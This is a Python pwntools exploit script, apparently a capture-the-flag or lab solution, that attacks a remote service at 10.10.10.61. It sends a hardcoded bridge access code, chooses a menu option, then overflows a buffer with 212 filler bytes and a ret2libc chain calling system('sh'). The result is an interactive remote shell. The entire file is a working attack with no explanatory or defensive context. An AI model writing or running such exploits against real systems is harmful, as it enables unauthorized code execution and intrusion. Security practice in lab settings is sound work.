import time

import struct

from pwn import *

from subprocess import call

#context(os = 'linux', arch = 'i386')



DEBUG = False

RHOST = "10.10.10.61"

RPORT = 32812



if DEBUG:

	context.log_level = 'debug'

else:

	context.log_level = 'info'

def conv(num):

	return struct.pack("<I",num)







payload = "A" * 212



payload += conv(0xf7e4c060) # system()



payload += conv(0xf7e3faf0) # exit()



payload += conv(0xf7f6ddd5) # 'sh'



r = remote(RHOST, RPORT)



r.recvuntil("Enter Bridge Access Code: ")



r.sendline("picarda1")



r.recvuntil("Waiting for input: ")



r.sendline("4")



r.recvuntil("Enter Security Override:")



r.sendline(payload)



r.interactive()
